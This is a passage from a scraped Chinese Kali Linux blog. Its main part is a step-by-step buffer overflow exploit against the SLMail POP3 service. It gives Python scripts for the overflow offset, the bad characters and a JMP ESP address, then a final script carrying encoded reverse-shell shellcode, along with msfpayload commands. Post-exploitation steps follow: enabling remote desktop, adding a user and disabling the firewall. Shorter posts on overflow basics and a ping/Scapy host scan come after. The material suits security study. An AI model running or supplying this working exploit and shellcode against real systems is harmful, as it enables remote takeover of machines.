u6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9&apos;</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>找到精确溢出的4个字节<ul>
<li><strong><code>🔺命令：./05.py</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*20</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>window系统为小端存储形式，低位高地址，高位低地址
EIP为4个十六进制的数字，可通过ASCII换算成字符串
ESP存放着EIP溢出的内容，可以填放shell code作为远程执行代码</code></pre></blockquote>
<ol start="6">
<li><p>FUZZING</p>
<ul>
<li>思路：<ul>
<li>将EIP修改为Shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP寄存器数值，将跳转到Shellcode代码段并执行</li>
</ul>
</li>
<li>寻找可存放Shellcode的内容空间</li>
<li><strong><code>🔺命令：./06.py</code></strong>（查看ESP寄存器可存放多少个字符）</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+&apos;C&apos;*(3500-2607-4)</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>


<ol start="7">
<li><p>FUZZING</p>
<ul>
<li>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途<ul>
<li>返回地址、Shellcode、buffer中都不能出现坏字符</li>
<li>null byte（0x00）空字符，用于终止字符串拷贝的操作</li>
<li>return（0x0D）回车操作，表示POP3 PASS命令输入完成</li>
<li>思路：发送0x00–0xff 256个字符，查找所有的坏字符</li>
<li><strong><code>🔺命令：./07.py</code></strong>（查找坏字符）</li>
<li>0x0A（导致后面数据无法出现）</li>
<li>0x0D（被过滤）</li>
<li>0x00（被过滤）</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>字符传进寄存器，可能会被过滤，也可能使服务端carsh</code></pre></blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=&#123;&#125;</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;B&apos;*4+badchars</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ol start="8">
<li><p>FUZZING</p>
<ul>
<li>重定向数据流<ul>
<li>用ESP的地址替换EIP的值</li>
<li>但是ESP地址变化，硬编码不可行（每次操作系统随机分配）</li>
<li>SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围使不确定的</li>
</ul>
</li>
<li>变通思路<ul>
<li>在内存中寻找地址固定的系统模块</li>
<li>在模块中寻找JMP ESP指定的地址跳转，再由该指令间接跳转到ESP，从而执行Shellcode</li>
<li>mono.py脚本识别内存模块，搜索”return address”是JMP ESP指令的模块</li>
<li>寻找无DEP、ALSR保护的内存地址</li>
<li>内存地址不包含坏字符</li>
</ul>
</li>
</ul>
</li>
<li><p>FUZZING</p>
<ul>
<li>寻找不受保护的系统模块<ul>
<li>!mona modules</li>
</ul>
</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>Rebase：操作系统重启，内存地址是否发生变化，基地址变化，为False
SafeSEH、ASLR：操作系统提供的内存保护机制，为False
OS DLL：操作系统自带的动态链接库，为True</code></pre></blockquote>
<ul>
<li>将汇编指令JMP ESP转换为二进制<ul>
<li><strong><code>🔺命令：./nasm shell</code></strong></li>
<li>FFE4</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>msf脚本工具：
/usr/share/metasploit-framwork/tools/nasm_shell rb（汇编语言转换为二进制）</code></pre></blockquote>
<ul>
<li>在模块中搜索FFE4指令<ul>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m openc32.dll</li>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m mfc42.dll</li>
<li>！mona find -s “\xFF\xE4”(JMP ESP对应的二进制指令) -m slmfc.dll</li>
<li>选择不包含坏字符的内存地址</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>切换汇编语言表示形式：Disassemble
Memory Map内存地址图查看模块对应的基地址是否收到DEP,ALSR的保护，是否需要绕过
▲绕过DEP的一种方法：Menmory Map中的对应的基址的Pocess需为（RE可读可执行）</code></pre></blockquote>
<ul>
<li>在该地址设置断点<ul>
<li>设置断点：右键 → BreakPoint → Memory on acess</li>
<li>Debug → Step info单步执行</li>
</ul>
</li>
<li>重发buffer（小端存储 → 地址完全翻转）<ul>
<li><strong><code>🔺命令：./08.py</code></strong>（查看模块指令的地址是否为ESP的地址）</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;C&apos;*390</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<ol start="10">
<li><p>FUZZING </p>
<ul>
<li>生成Shellcode（注意坏字符）</li>
<li>Scratch（写Shellcode的工具）</li>
<li>cd /usr/share/framework2</li>
<li><strong><code>🔺命令：./msfpayload -l</code></strong></li>
<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=反向IP地址 LPORT=反向端口 C</code></strong></li>
<li><strong><code>🔺命令：./msfpayload win32_reverse LHOST=IP地址 LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong>（最后需要用”+”进行连接）</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>win32_adduser 增加用户的Shellcode
win32_bind    增加监听的进程，可以开启相应的端口
▲ 正向的bind基本上会被防火墙过滤
▲ 反向（reserver）的bind，服务端会开放端口，主动连接外部网络
▲ msfencode可对Shellcode做免杀，也可以编掉坏字符，进行编码需要指定原始格式 R</code></pre></blockquote>
<ul>
<li>**`🔺命令：nc -vlp 443</li>
<li><strong><code>🔺命令：./09.py</code></strong>（脚本后门）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7c\xac\x3f&quot;+</span><br><span class="line">&quot;\xac\x83\xeb\xfc\xe2\xf4\x80\xc6\xd4\xe1\x94\x55\xc0\x53\x83\xcc&quot;+</span><br><span class="line">&quot;\xb4\xc0\x58\x88\xb4\xe9\x40\x27\x43\xa9\x04\xad\xd0\x27\x33\xb4&quot;+</span><br><span class="line">&quot;\xb4\xf3\x5c\xad\xd4\xe5\xf7\x98\xb4\xad\x92\x9d\xff\x35\xd0\x28&quot;+</span><br><span class="line">&quot;\xff\xd8\x7b\x6d\xf5\xa1\x7d\x6e\xd4\x58\x47\xf8\x1b\x84\x09\x49&quot;+</span><br><span class="line">&quot;\xb4\xf3\x58\xad\xd4\xca\xf7\xa0\x74\x27\x23\xb0\x3e\x47\x7f\x80&quot;+</span><br><span class="line">&quot;\xb4\x25\x10\x88\x23\xcd\xbf\x9d\xe4\xc8\xf7\xef\x0f\x27\x3c\xa0&quot;+</span><br><span class="line">&quot;\xb4\xdc\x60\x01\xb4\xec\x74\xf2\x57\x22\x32\xa2\xd3\xfc\x83\x7a&quot;+</span><br><span class="line">&quot;\x59\xff\x1a\xc4\x0c\x9e\x14\xdb\x4c\x9e\x23\xf8\xc0\x7c\x14\x67&quot;+</span><br><span class="line">&quot;\xd2\x50\x47\xfc\xc0\x7a\x23\x25\xda\xca\xfd\x41\x37\xae\x29\xc6&quot;+</span><br><span class="line">&quot;\x3d\x53\xac\xc4\xe6\xa5\x89\x01\x68\x53\xaa\xff\x6c\xff\x2f\xef&quot;+</span><br><span class="line">&quot;\x6c\xef\x2f\x53\xef\xc4\xbc\x04\x5b\xc6\x1a\xc4\x3e\x17\x1a\xff&quot;+</span><br><span class="line">&quot;\xb6\x4d\xe9\xc4\xd3\x55\xd6\xcc\x68\x53\xaa\xc6\x2f\xfd\x29\x53&quot;+</span><br><span class="line">&quot;\xef\xca\x16\xc8\x59\xc4\x1f\xc1\x55\xfc\x25\x85\xf3\x25\x9b\xc6&quot;+</span><br><span class="line">&quot;\x7b\x25\x9e\x9d\xff\x5f\xd6\x39\xb6\x51\x82\xee\x12\x52\x3e\x80&quot;+</span><br><span class="line">&quot;\xb2\xd6\x44\x07\x94\x07\x14\xde\xc1\x1f\x6a\x53\x4a\x84\x83\x7a&quot;+</span><br><span class="line">&quot;\x64\xfb\x2e\xfd\x6e\xfd\x16\xad\x6e\xfd\x29\xfd\xc0\x7c\x14\x01&quot;+</span><br><span class="line">&quot;\xe6\xa9\xb2\xff\xc0\x7a\x16\x53\xc0\x9b\x83\x7c\x57\x4b\x05\x6a&quot;+</span><br><span class="line">&quot;\x46\x53\x09\xa8\xc0\x7a\x83\xdb\xc3\x53\xac\xc4\xcf\x26\x78\xf3&quot;+</span><br><span class="line">&quot;\x6c\x53\xaa\x53\xef\xac&quot;)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;\x90&apos;*8+shellcode</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IP地址&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>汇编语言的\0x90，表示NOP（不操作），为了保证Shellcode运行有效性，从经验上来谈，CPU在跳转解析的时候，可能会擦除，覆盖Shellcode的前几个字符，所以需要加NOP进行不操作</code></pre></blockquote>
<ol start="11">
<li><p>FUZZING</p>
<ul>
<li>早期的msfpayload<ul>
<li>Shellcode执行后会一ExitProcess方式退出整个进程，将导致邮件服务崩溃</li>
<li>SLMail是一个基于线程的应用，适用ExitThread方式可以避免整个系统崩溃，可实现重复溢出</li>
<li><strong><code>🔺命令：./msfpayload win32_reverser LHOST=反向IP地址 EXITFUNC=thread LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><p>FUZZING</p>
</li>
</ol>
<blockquote>
<pre><code>1.修改注册表开启远程桌面控制后需重启计算机（shutdown -r -t 0）
2.查看远程桌面是否开启（我的电脑 → 属性 → 远程）
3.apt-get install rdesktop
4.rdesktop 远程IP
5.nc -vlp 443 
6.增加用户（net user 用户 密码 /add）
▲ 可以通过注册表关闭防火墙（regsnap可抓取注册表变化）</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/" itemprop="url">Kali Linux笔记(二十六)：缓冲区溢出介绍</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-11T13:03:16+08:00">
                2019-12-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>程序漏洞从哪里来（程序的动态，变量）</p>
<ul>
<li>罪恶的根源：变量</li>
<li>数据与代码边界不清（输入数据或者代码）</li>
<li>最简漏洞原理–shell脚本漏洞<ul>
<li><strong><code>🔺命令：./a.sh 参数</code></strong>（; | &amp;&amp; &amp;）</li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo $1</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>./a.sh ; pwd →  /root</code></pre></blockquote>
<ol start="2">
<li><p>缓存区溢出</p>
<ul>
<li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓存区“撑爆”，从而覆盖了相邻内存区域的数据；</li>
<li>成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权限等后果</li>
</ul>
</li>
<li><p>如何发现漏洞</p>
<ul>
<li>源码审计（源码 → 使用了不安全的函数，对用户数据进行过滤，编码）</li>
<li>逆向工程（打包后的程序 → 反汇编 ）</li>
<li>模糊测试（在新的OS环境中，在OS中进行安装，用工具进行监视，调试，插入）<ul>
<li>向程序堆栈半随机的数据，根据内存变化判断溢出</li>
<li>数据生成器：生成随机，半随机数据（编程语言实现打向程序）</li>
<li>测试工具：识别溢出漏洞（动态调试工具）</li>
</ul>
</li>
</ul>
</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0/" itemprop="url">Kali Linux笔记(十五)：主机发现--三层发现</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<ol>
<li><p>发现-三层发现（ping）</p>
<ul>
<li>优点<ul>
<li>可路由</li>
<li>速度比较快</li>
</ul>
</li>
<li>缺点<ul>
<li>速度比二层慢</li>
<li>经常被边界防火墙过滤（目标系统的过滤机制）</li>
</ul>
</li>
<li>IP、ICMP协议</li>
</ul>
</li>
</ol>
<blockquote>
<pre><code>ICMP协议，网络控制管理协议，路径发现，探测，根据相应结果来反应目标主机的状态
ICMP协议，发送端的报文类型是询问报文，Type字段为8，接收端为0
网络上默认禁止ICMP的探测数据包，所以导致扫描结果不准确，存在误报，漏报，错报</code></pre></blockquote>
<ul>
<li><strong><code>🔺命令：Ping IP地址 -c 2</code></strong></li>
<li><strong><code>🔺命令：Ping -R（路由追踪） IP地址 / traceroute IP地址</code></strong></li>
<li><strong><code>🔺命令：ping  IP地址 -c 1 | grep &quot;bytes from&quot; | awk &#39;{print $4}&#39;</code></strong></li>
<li>脚本<ul>
<li><strong><code>🔺命令：./pinger.sh IP网段</code></strong>  ▲2019.12.2 iplist文档中ip地址后面有：，还无法去除</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;Usage - ./pinger.sh [/24 network address]&quot;</span><br><span class="line">    echo &quot;Example - ./pinger.sh 192.168.100.0&quot;</span><br><span class="line">    echo &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)</span><br><span class="line">for add in $(seq 1 254);do</span><br><span class="line">  ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | awk &apos;&#123;print $4&#125;&apos;  &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<blockquote>
<pre><code>Linux/Unix数据包的TTL值默认为64
ping -R 请求离主机比较远的网卡的IP地址（同个路由器）
traceroute 请求离主机比较近的网卡的IP地址（同个路由器）</code></pre></blockquote>
<ol start="2">
<li><p>发现-三层发现（Scapy）</p>
<ul>
<li>Scapy<ul>
<li>OSI多层堆叠手工声称ICMP包-IP/ICMP包</li>
<li>ip=IP()</li>
<li>icmp=ICMP()</li>
<li>ping=(ip/icmp)</li>
<li>ping[IP].dst=”IP地址”</li>
<li>a=sr1(ping)</li>
<li>a.dispaly</li>
<li>Ping不存在的地址：a=sr1(ip/icmp,timeout=1)</li>
<li>a=sr1(IP(dst=”IP地址”)/ICMP(),timeout=1)  //一句话实现</li>
</ul>
</li>
<li><strong><code>🔺命令：./pinger1.py IP网段&gt;iplist.txt</code></strong></li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./pinger1.py [/24 network address]&quot;</span><br><span class="line">    print &quot;Example - ./pinger1.py 192.168.100.0&quot;</span><br><span class="line">    print &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[1])</span><br><span 